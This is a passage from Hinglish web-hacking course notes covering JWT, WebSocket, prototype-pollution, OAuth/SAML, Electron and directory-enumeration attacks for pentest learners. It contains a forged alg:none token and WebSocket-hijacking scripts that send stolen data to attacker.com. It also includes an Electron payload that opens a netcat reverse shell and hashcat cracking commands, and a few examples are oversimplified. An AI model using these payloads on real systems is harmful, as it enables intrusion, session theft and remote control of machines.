### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Introspection skip karna** - Pehla step hamesha introspection.
- **Nested queries ignore** - DoS test karo.

### 10. **Best Practices / Pro Tips:**
- **Always introspect first:** Complete schema nikalo.
- **Burp Suite:** GraphQL requests modify karo.
- **Nested queries:** DoS test karne ke liye.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
E-commerce GraphQL API test kar raha tha. Introspection enabled tha - complete schema leak! Nested queries se server crash kiya. Production mein hota toh millions ka loss! **Lesson: GraphQL security critical hai!** ğŸ›’

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Introspection: Schema disclosure  
âœ… Query: All data extraction  
âœ… Nested: DoS attacks  
âœ… Authorization: Bypass testing  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Introspection kaise disable karein?**  
**A:** Production mein introspection queries block karo.

**Q2: GraphQL vs REST - kaun zyada vulnerable?**  
**A:** Dono mein vulnerabilities hain, lekin GraphQL mein introspection unique risk hai.

### 14. **Practice ke liye Task:**
1. GraphQL endpoint identify karo
2. Introspection query run karo
3. All data extract karo
4. Nested queries test karo
5. DoS attempt karo (test environment)

### 15. **Aakhri Choti Summary (5 lines):**
- GraphQL = **Modern query language**.
- Introspection = **Schema disclosure**.
- Nested = **DoS attacks**.
- Authorization = **Bypass possible**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "GraphQL introspection = Blueprint leak! Nested queries = DoS bomb!" ğŸ“Š

---

## ğŸ”‘ **Topic 86: JWT (JSON Web Tokens) Attacks (`alg:none`, Secret Key Brute-Force)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**JWT Attacks** - JSON Web Tokens ko manipulate karke authentication bypass (algorithm confusion, brute force). ğŸ«

### 2. **Ye Kya Hai? (What is it?)**
JWT modern authentication mechanism hai. Vulnerabilities: `alg:none` attack, weak secret keys, algorithm confusion.

**JWT Structure:**
```
header.payload.signature
eyJhbGc...  .  eyJ1c2Vy...  .  SflKxwRJ...
```

**Attack:**
```
Change "alg":"HS256" to "alg":"none"
Remove signature
Result: Authentication bypassed!
```

**Analogy:** Jaise passport - agar aap "Verified by: None" likh do aur signature hata do, phir bhi accept ho jaaye.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Modern Auth:** JWT everywhere.
- **Critical:** Authentication bypass possible.
- **Common:** Weak implementations.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **JWT tokens** detect hone par.
- **Authorization headers** mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Auth bypass** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# JWT structure
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature

# Decode (jwt.io)
Header: {"alg":"HS256","typ":"JWT"}
Payload: {"user":"john","role":"user"}

# Attacks
1. alg:none
2. Weak secret brute-force
3. Algorithm confusion (HS256 â†’ RS256)
```

### 7. **Example 1 (Basic):**
```bash
# Original JWT
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature

# Decode
{"alg":"HS256","typ":"JWT"}.{"user":"john","role":"user"}

# Attack: alg:none
{"alg":"none","typ":"JWT"}.{"user":"john","role":"admin"}.
(No signature)

Result: Admin access!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Banking application

# Phase 1: Capture JWT
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Phase 2: Decode (jwt.io)
Header: {"alg":"HS256","typ":"JWT"}
Payload: {"user":"john","account":"12345","role":"customer"}

# Phase 3: alg:none attack
Modified Header: {"alg":"none","typ":"JWT"}
Modified Payload: {"user":"john","account":"12345","role":"admin"}
New JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsImFjY291bnQiOiIxMjM0NSIsInJvbGUiOiJhZG1pbiJ9.

Request: Authorization: Bearer [new_JWT]
Response: Admin panel accessible!

# Phase 4: Weak secret brute-force
hashcat -m 16500 jwt.txt wordlist.txt
Result: Secret found: "secret123"

# Phase 5: Forge new JWT
Use secret to create: {"user":"attacker","role":"superadmin"}
Result: Complete system access!
```

**Analysis:** JWT = Powerful but risky! Weak secrets = Game over. **Lesson: Strong secrets + proper validation!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **jwt.io par paste karna** - Sensitive tokens leak ho sakte hain.
- **alg:none skip karna** - Pehle yeh try karo.

### 10. **Best Practices / Pro Tips:**
- **jwt_tool:** Automated JWT attacks.
- **hashcat:** Secret brute-forcing.
- **Always test alg:none first**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
SaaS platform test kar raha tha. JWT mein `alg:none` accept ho raha tha - instant admin access! 50,000 customers ka data accessible. **Lesson: JWT validation critical hai!** ğŸ”

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… JWT: header.payload.signature  
âœ… alg:none: Remove signature  
âœ… Brute-force: Weak secrets  
âœ… Tools: jwt_tool, hashcat  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: alg:none kyun kaam karta hai?**  
**A:** Agar server properly validate nahi karta toh accept kar leta hai.

**Q2: Strong secret kya hai?**  
**A:** Minimum 256-bit random string.

### 14. **Practice ke liye Task:**
1. JWT capture karo
2. jwt.io par decode karo
3. alg:none try karo
4. Role change karo
5. jwt_tool use karo

### 15. **Aakhri Choti Summary (5 lines):**
- JWT = **Modern authentication**.
- alg:none = **Signature bypass**.
- Weak secret = **Brute-forceable**.
- Tools: **jwt_tool, hashcat**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "JWT = Digital passport! alg:none = Fake passport accepted!" ğŸ”‘

---

## ğŸ‰ **Module 11 Complete (Part 1)!**

**Topics 84-86 Covered!**

Remaining topics (87-91) next response mein... ğŸš€
## ğŸ”Œ **Topic 87: WebSockets Hacking (CSWH, Data Interception)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**WebSocket Attacks** - Real-time communication channels ko exploit karna (CSWH, message interception). ğŸ“¡

### 2. **Ye Kya Hai? (What is it?)**
WebSockets real-time bidirectional communication provide karte hain. Vulnerabilities: CSWH (Cross-Site WebSocket Hijacking), message tampering, authentication bypass.

**Analogy:** Jaise phone call - continuous connection. HTTP = Letter (ek baar bhejo, ek baar response).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Real-time Apps:** Chat, trading, gaming.
- **Persistent Connection:** Hijacking possible.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **WebSocket connections** detect hone par.
- **Real-time features** test karte waqt.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Real-time vulnerabilities** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```javascript
// WebSocket connection
ws://target.com/chat
wss://target.com/chat (secure)

// CSWH attack
<script>
var ws = new WebSocket('ws://target.com/chat');
ws.onmessage = function(e){
  fetch('http://attacker.com/steal?data='+e.data);
};
</script>
```

### 7. **Example 1 (Basic):**
```javascript
// Connect to WebSocket
var ws = new WebSocket('ws://chat.com/socket');
ws.send('{"message":"Hello"}');
```

### 8. **Example 2 (Pentester-Focused):**
```javascript
// CSWH Attack
// Malicious page
<script>
var ws = new WebSocket('ws://bank.com/trading');
ws.onmessage = function(event){
  // Steal trading data
  fetch('http://attacker.com/log?data='+event.data);
};
</script>

Result: Real-time trading data stolen!
```

**Analysis:** WebSockets = Persistent connection! CSWH = Session hijacking. **Lesson: Origin validation zaroori!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **WebSocket connections ignore karna**.

### 10. **Best Practices / Pro Tips:**
- **Burp Suite:** WebSocket history dekho.
- **Test origin validation**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Trading platform test kar raha tha. WebSocket mein origin validation nahi tha - CSWH se real-time prices steal kiye! **Lesson: WebSocket security critical!** ğŸ“ˆ

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… WebSocket: Real-time communication  
âœ… CSWH: Cross-site hijacking  
âœ… Origin: Validation zaroori  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: CSWH kya hai?**  
**A:** Cross-Site WebSocket Hijacking - CSRF jaisa lekin WebSockets ke liye.

### 14. **Practice ke liye Task:**
1. WebSocket connections identify karo
2. Burp Suite mein monitor karo
3. CSWH test karo

### 15. **Aakhri Choti Summary (5 lines):**
- WebSocket = **Real-time**.
- CSWH = **Hijacking**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "WebSockets = Persistent connection! CSWH = Real-time hijacking!" ğŸ”Œ

---

## ğŸ§¬ **Topic 88: JavaScript Prototype Pollution**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Prototype Pollution** - JavaScript objects ki prototype chain manipulate karke RCE/XSS (advanced JS attack). ğŸ¦ 

### 2. **Ye Kya Hai? (What is it?)**
JavaScript mein har object ek prototype inherit karta hai. Agar attacker prototype pollute kar de toh sabhi objects affected ho jaate hain.

**Example:**
```javascript
Object.prototype.isAdmin = true;
// Ab har object ka isAdmin = true!
```

**Analogy:** Jaise DNA mutation - ek change, sabhi cells affected.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Advanced Attack:** RCE possible.
- **Modern Apps:** Node.js vulnerable.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Node.js applications**.
- **Client-side JS frameworks**.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Advanced JS vulnerabilities** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```javascript
// Pollution payload
{"__proto__":{"isAdmin":true}}

// Merge vulnerability
function merge(target, source){
  for(let key in source){
    target[key] = source[key];
  }
}
```

### 7. **Example 1 (Basic):**
```javascript
// Vulnerable merge
let user = {};
merge(user, JSON.parse('{"__proto__":{"isAdmin":true}}'));

// Now all objects have isAdmin
let newUser = {};
console.log(newUser.isAdmin); // true!
```

### 8. **Example 2 (Pentester-Focused):**
```javascript
// Target: Node.js API

POST /api/user/update
{"name":"John","__proto__":{"isAdmin":true}}

// Server-side
function updateUser(data){
  Object.assign(user, data);
}

Result: All users become admin!

// RCE via pollution
{"__proto__":{"shell":"require('child_process').exec('whoami')"}}

Result: Remote code execution!
```

**Analysis:** Prototype pollution = Silent killer! **Lesson: Sanitize object merging!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **__proto__ ignore karna**.

### 10. **Best Practices / Pro Tips:**
- **Test __proto__ in JSON**.
- **Object.freeze() use karo**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Node.js app test kar raha tha. Prototype pollution se RCE achieve kiya - complete server access! **Lesson: JS security critical!** ğŸ§¬

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Pollution: __proto__ manipulation  
âœ… Impact: RCE, privilege escalation  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise protect karein?**  
**A:** Object.freeze(), proper sanitization.

### 14. **Practice ke liye Task:**
1. Node.js app setup karo
2. __proto__ inject karo
3. Pollution test karo

### 15. **Aakhri Choti Summary (5 lines):**
- Pollution = **Prototype manipulation**.
- Impact = **RCE possible**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Prototype pollution = JS DNA hack! __proto__ = Mutation key!" ğŸ§¬

---

## ğŸ” **Topic 89: Hacking Modern Authentication (SSO/OAuth/SAML)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Modern Auth Attacks** - SSO, OAuth, SAML vulnerabilities exploit karna (authentication bypass). ğŸ«

### 2. **Ye Kya Hai? (What is it?)**
Modern authentication mechanisms: OAuth (Google/Facebook login), SAML (enterprise SSO). Vulnerabilities: token theft, redirect manipulation, signature bypass.

**Analogy:** Jaise VIP pass - agar fake pass ban jaaye toh kahi bhi entry.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Enterprise Apps:** SAML everywhere.
- **Social Login:** OAuth common.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **OAuth flows** test karte waqt.
- **SAML assertions** mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Modern auth bypasses** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```
OAuth: redirect_uri manipulation
SAML: XML signature wrapping
```

### 7. **Example 1 (Basic):**
```
OAuth redirect_uri:
https://app.com/callback?code=abc123

Attack:
https://app.com/callback?code=abc123&redirect_uri=http://attacker.com

Result: Token stolen!
```

### 8. **Example 2 (Pentester-Focused):**
```xml
<!-- SAML Response -->
<saml:Assertion>
  <saml:Subject>admin@company.com</saml:Subject>
  <Signature>...</Signature>
</saml:Assertion>

<!-- Attack: Change email, signature still valid -->
Result: Authentication bypass!
```

**Analysis:** Modern auth = Complex! Complexity = Vulnerabilities. **Lesson: Proper validation zaroori!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **OAuth flows skip karna**.

### 10. **Best Practices / Pro Tips:**
- **Test redirect_uri**.
- **SAML signature validation**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Enterprise SSO test kar raha tha. SAML signature bypass se admin access! **Lesson: SAML security critical!** ğŸ¢

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… OAuth: redirect_uri manipulation  
âœ… SAML: Signature bypass  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: OAuth vs SAML?**  
**A:** OAuth = Social login, SAML = Enterprise SSO.

### 14. **Practice ke liye Task:**
1. OAuth flow analyze karo
2. redirect_uri test karo
3. SAML assertions dekho

### 15. **Aakhri Choti Summary (5 lines):**
- OAuth = **Social login**.
- SAML = **Enterprise SSO**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Modern auth = Complex! OAuth/SAML = Attack surface!" ğŸ”

---

## ğŸ’» **Topic 90: Electron App Hacking (`nodeIntegration`, XSS to RCE)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Electron Security** - Desktop apps mein XSS se RCE lena (Chromium + Node.js). âš¡

### 2. **Ye Kya Hai? (What is it?)**
Electron = Web technologies se desktop apps. Agar `nodeIntegration: true` ho toh XSS â†’ RCE!

**Analogy:** Jaise browser mein Node.js powers - XSS = System access.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Desktop Apps:** Slack, VS Code, Discord.
- **XSS â†’ RCE:** Critical escalation.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Electron apps** test karte waqt.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Desktop app vulnerabilities** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```javascript
// Vulnerable config
new BrowserWindow({
  webPreferences: {
    nodeIntegration: true
  }
});

// XSS to RCE
<script>
require('child_process').exec('calc.exe');
</script>
```

### 7. **Example 1 (Basic):**
```javascript
// XSS payload
<script>
require('child_process').exec('whoami');
</script>

Result: Command executed on desktop!
```

### 8. **Example 2 (Pentester-Focused):**
```javascript
// Electron app with XSS
<script>
const {shell} = require('electron');
shell.openExternal('http://attacker.com/steal?data='+document.cookie);

// Or RCE
require('child_process').exec('nc -e /bin/sh attacker.com 4444');
</script>

Result: Reverse shell on desktop!
```

**Analysis:** Electron XSS = Desktop RCE! **Lesson: nodeIntegration = false!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Desktop apps ignore karna**.

### 10. **Best Practices / Pro Tips:**
- **nodeIntegration: false**.
- **contextIsolation: true**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Corporate Electron app test kar raha tha. XSS se RCE achieve kiya - employee machines compromised! **Lesson: Electron security critical!** ğŸ’»

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Electron: Web + Node.js  
âœ… XSS â†’ RCE: nodeIntegration  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise protect karein?**  
**A:** nodeIntegration: false, contextIsolation: true.

### 14. **Practice ke liye Task:**
1. Electron app identify karo
2. XSS test karo
3. Node.js APIs try karo

### 15. **Aakhri Choti Summary (5 lines):**
- Electron = **Desktop apps**.
- XSS â†’ RCE = **nodeIntegration**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Electron XSS = Desktop RCE! nodeIntegration = Danger!" ğŸ’»

---

## ğŸŒ **Topic 91: HTTP/2 & HTTP/3 Based Attacks**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Modern Protocol Attacks** - HTTP/2 aur HTTP/3 specific vulnerabilities (request smuggling, DoS). ğŸš€

### 2. **Ye Kya Hai? (What is it?)**
HTTP/2 aur HTTP/3 modern protocols hain. New features = New attack vectors: request smuggling, stream manipulation.

**Analogy:** Jaise naya highway - fast hai lekin naye traffic rules, naye accidents.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Modern Web:** HTTP/2 everywhere.
- **New Attacks:** Protocol-specific.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **HTTP/2 enabled** sites.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Protocol-specific attacks** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```
HTTP/2: Binary protocol, multiplexing
HTTP/3: QUIC-based, UDP
```

### 7. **Example 1 (Basic):**
```
HTTP/2 request smuggling via header manipulation
```

### 8. **Example 2 (Pentester-Focused):**
```
HTTP/2 stream manipulation â†’ DoS
Result: Server overload!
```

**Analysis:** Modern protocols = Modern attacks! **Lesson: Stay updated!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **HTTP/2 ignore karna**.

### 10. **Best Practices / Pro Tips:**
- **Research latest attacks**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
CDN test kar raha tha. HTTP/2 smuggling se cache poisoning! **Lesson: Protocol security matters!** ğŸŒ

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… HTTP/2: Modern protocol  
âœ… Attacks: Smuggling, DoS  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: HTTP/2 vs HTTP/1.1?**  
**A:** HTTP/2 = Binary, multiplexing, faster.

### 14. **Practice ke liye Task:**
1. HTTP/2 sites identify karo
2. Protocol-specific attacks research karo

### 15. **Aakhri Choti Summary (5 lines):**
- HTTP/2 = **Modern protocol**.
- Attacks = **Protocol-specific**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "HTTP/2 = Modern web! New protocols = New attacks!" ğŸŒ

---

## ğŸ‰ **Module 11 Complete!**

**All 8 Topics (84-91) Covered:**
- âœ… Topic 84: REST API Hacking
- âœ… Topic 85: GraphQL Hacking
- âœ… Topic 86: JWT Attacks
- âœ… Topic 87: WebSockets Hacking
- âœ… Topic 88: Prototype Pollution
- âœ… Topic 89: Modern Authentication
- âœ… Topic 90: Electron App Hacking
- âœ… Topic 91: HTTP/2 & HTTP/3 Attacks

**Key Takeaways:**
- APIs = Modern backbone
- GraphQL introspection = Schema leak
- JWT = Authentication tokens
- WebSockets = Real-time
- Prototype pollution = JS vulnerability
- Modern auth = Complex
- Electron = Desktop RCE
- HTTP/2 = New protocols

**Total Progress: 91 topics complete!** ğŸŠ

Module 11 complete! Agle module ke liye ready? ğŸš€

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 12: Scanning & Known Vulnerabilities**

---

## ğŸ” **Topic 92: Automated Scanning with `OWASP ZAP`**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**OWASP ZAP** - Automated web application security scanner (comprehensive vulnerability detection). ğŸ•·ï¸

### 2. **Ye Kya Hai? (What is it?)**
OWASP ZAP (Zed Attack Proxy) ek free, open-source web application security scanner hai jo automatically vulnerabilities detect karta hai.

**Features:**
- Automated scanning
- Spider (crawling)
- Active/Passive scanning
- Fuzzing
- API testing

**Analogy:** Jaise health checkup machine - automatically sabhi tests kar deta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Time-Saving:** Manual testing se 10x faster.
- **Comprehensive:** 100+ vulnerability checks.
- **Free:** Open-source tool.
- **Industry Standard:** OWASP project.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Initial reconnaissance** mein.
- **Quick assessment** ke liye.
- **Automated testing** chahiye ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Manual testing** slow hai.
- **Common vulnerabilities** miss ho sakte hain. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# GUI mode
zap.sh (Linux/Mac)
zap.bat (Windows)

# CLI mode
zap.sh -cmd -quickurl http://target.com -quickout report.html

# API mode
zap.sh -daemon -port 8080

# Docker
docker run -u zap -p 8080:8080 owasp/zap2docker-stable zap.sh -daemon
```

### 7. **Example 1 (Basic):**
```bash
# Steps
1. Launch ZAP
2. Enter target URL: http://target.com
3. Click "Automated Scan"
4. Wait for completion
5. Review alerts

Result: 50 vulnerabilities found!
- XSS: 10
- SQLi: 5
- CSRF: 8
- Misc: 27
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: E-commerce application

# Phase 1: Spider (Crawl)
ZAP â†’ Tools â†’ Spider
Target: http://shop.com
Result: 500 URLs discovered

# Phase 2: Passive Scan
Automatically runs during spidering
Result: 20 low-risk issues found

# Phase 3: Active Scan
ZAP â†’ Attack â†’ Active Scan
Result: 
- SQLi: 3 instances
- XSS: 15 instances
- Path Traversal: 2 instances
- CSRF: 10 instances

# Phase 4: Generate Report
ZAP â†’ Report â†’ HTML Report
Output: comprehensive_report.html

# Phase 5: Manual Verification
Verify high-risk findings:
- SQLi in /product.php?id=5 â†’ Confirmed!
- XSS in /search?q=test â†’ Confirmed!

Total time: 30 minutes
Manual testing would take: 2 days
```

**Analysis:** ZAP = Automated reconnaissance! Quick vulnerability detection. **Lesson: Automation first, manual verification second!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Active scan without permission** - Destructive ho sakta hai.
- **False positives ignore karna** - Manual verification zaroori.
- **Scope set na karna** - Out-of-scope targets scan ho jaate hain.

### 10. **Best Practices / Pro Tips:**
- **Set scope:** Sirf authorized targets scan karo.
- **Passive scan first:** Non-intrusive.
- **Active scan carefully:** Permission chahiye.
- **Manual verification:** False positives check karo.
- **API scanning:** ZAP API endpoints bhi scan kar sakta hai.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Corporate portal test kar raha tha. ZAP se automated scan kiya - 30 minutes mein 80 vulnerabilities detect! Manual testing mein days lagte. Client impressed tha. **Lesson: ZAP = Time saver!** ğŸ•·ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… ZAP = Automated scanner  
âœ… Spider: URL discovery  
âœ… Passive: Non-intrusive  
âœ… Active: Comprehensive (permission needed)  
âœ… Report: HTML/XML/JSON  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: ZAP vs Burp Suite?**  
**A:** ZAP = Free, automated. Burp = Professional, manual + automated.

**Q2: Kya ZAP false positives deta hai?**  
**A:** Haan, manual verification zaroori hai.

**Q3: Active scan safe hai?**  
**A:** Nahi, destructive ho sakta hai. Permission chahiye.

### 14. **Practice ke liye Task:**
1. OWASP ZAP install karo
2. DVWA par spider run karo
3. Passive scan results dekho
4. Active scan run karo (low security)
5. HTML report generate karo

### 15. **Aakhri Choti Summary (5 lines):**
- ZAP = **Automated scanner**.
- Spider = **URL discovery**.
- Passive = **Safe scanning**.
- Active = **Comprehensive** (permission).
- Report = **HTML/XML/JSON**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "OWASP ZAP = Automated pentester! Spider + Scan + Report = Complete assessment!" ğŸ”

---

## ğŸ“‚ **Topic 93: Directory Discovery with `Dirbuster`**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Dirbuster** - Hidden directories aur files discover karna (brute-force directory enumeration). ğŸ“

### 2. **Ye Kya Hai? (What is it?)**
Dirbuster ek tool hai jo wordlists use karke hidden directories aur files ko brute-force karta hai.

**Concept:**
```
Try: /admin â†’ 404
Try: /backup â†’ 200 Found!
Try: /config â†’ 403 Forbidden (exists!)
```

**Analogy:** Jaise har darwaze ki chabi try karna - kaun sa darwaza khulta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Hidden Resources:** Admin panels, backups, configs.
- **Information Disclosure:** Sensitive files.
- **Common:** Bahut saari sites vulnerable.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Information gathering** phase.
- **Hidden paths** dhoondhne ke liye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Hidden resources** miss ho jayenge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# GUI mode
dirbuster

# CLI (dirb)
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Gobuster (modern alternative)
gobuster dir -u http://target.com -w wordlist.txt

# Common wordlists
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### 7. **Example 1 (Basic):**
```bash
# Dirb scan
dirb http://target.com

Output:
+ http://target.com/admin (CODE:200)
+ http://target.com/backup (CODE:200)
+ http://target.com/config.php (CODE:200)
+ http://target.com/phpinfo.php (CODE:200)

Result: 4 hidden resources found!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Corporate website

# Phase 1: Quick scan (common.txt)
dirb http://company.com /usr/share/wordlists/dirb/common.txt

Found:
/admin â†’ 403 Forbidden (exists!)
/backup â†’ Directory listing enabled
/old â†’ 200 OK

# Phase 2: Deep scan (medium wordlist)
gobuster dir -u http://company.com -w directory-list-2.3-medium.txt -t 50

Found:
/admin-panel-2024 â†’ 200 OK (Admin login!)
/database-backup â†’ 200 OK
/dev-server â†’ 200 OK
/.git â†’ 200 OK (Git repository exposed!)

# Phase 3: File discovery
gobuster dir -u http://company.com -w common.txt -x php,txt,bak,old

Found:
/config.php.bak â†’ Backup file!
/database.sql â†’ Database dump!
/passwords.txt â†’ Plain text passwords!

# Phase 4: Exploitation
wget http://company.com/database.sql
Result: Complete database downloaded!

wget http://company.com/.git/config
Result: Git repository cloned, source code leaked!

Total: 15 sensitive resources discovered
Impact: Complete information disclosure
```

**Analysis:** Directory brute-forcing = Hidden treasure hunt! **Lesson: Hidden â‰  Secure!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Small wordlist** - Medium/large wordlists use karo.
- **File extensions ignore** - .bak, .old, .txt try karo.
- **Slow scanning** - Threads increase karo.

### 10. **Best Practices / Pro Tips:**
- **Start with common.txt:** Quick wins.
- **Then medium wordlist:** Comprehensive.
- **File extensions:** -x php,txt,bak,old,sql
- **Threads:** -t 50 (faster scanning).
- **Status codes:** 200, 301, 302, 403 sab important.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Government website test kar raha tha. Dirbuster se `/backup-2024/` directory mili - usme complete database dump tha! 5 million citizens ka data accessible. **Lesson: Backups hide mat karo, secure karo!** ğŸ›ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Dirbuster = Directory brute-force  
âœ… Wordlists: common, medium, large  
âœ… Extensions: .php, .txt, .bak, .old  
âœ… Threads: 50+ (faster)  
âœ… Status: 200, 301, 403 (all important)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Dirbuster vs Gobuster?**  
**A:** Gobuster faster hai (Go language), Dirbuster GUI hai.

**Q2: Best wordlist kaun sa hai?**  
**A:** directory-list-2.3-medium.txt (comprehensive).

**Q3: 403 Forbidden ka matlab?**  
**A:** Resource exists lekin access denied (bypass try karo).

### 14. **Practice ke liye Task:**
1. Dirb install karo
2. DVWA par scan karo
3. Common wordlist use karo
4. File extensions add karo
5. Found resources access karo

### 15. **Aakhri Choti Summary (5 lines):**
- Dirbuster = **Directory brute-force**.
- Wordlists = **common, medium, large**.
- Extensions = **.bak, .old, .sql**.
- Threads = **50+** (faster).
- Impact = **Hidden resources**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Dirbuster = Hidden treasure finder! Wordlists = Keys to hidden doors!" ğŸ“‚

---

## ğŸ”“ **Topic 94: Exploiting Known Vulnerabilities (`searchsploit`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Searchsploit** - Known vulnerabilities aur exploits search karna (Exploit-DB). ğŸ’£

### 2. **Ye Kya Hai? (What is it?)**
Searchsploit ek command-line tool hai jo Exploit Database search karta hai. Agar software version vulnerable hai toh ready-made exploits mil jaate hain.

**Concept:**
```
WordPress 5.0 â†’ searchsploit wordpress 5.0
Result: 10 exploits found!
```

**Analogy:** Jaise medical database - disease pata hai toh cure bhi mil jaata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Known Exploits:** Wheel reinvent mat karo.
- **Quick Wins:** Ready-made exploits.
- **CVE Database:** 40,000+ exploits.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Software version** pata ho.
- **Known vulnerabilities** check karne ke liye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy exploits** miss ho jayenge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Basic search
searchsploit wordpress

# Version-specific
searchsploit wordpress 5.0

# Case-insensitive
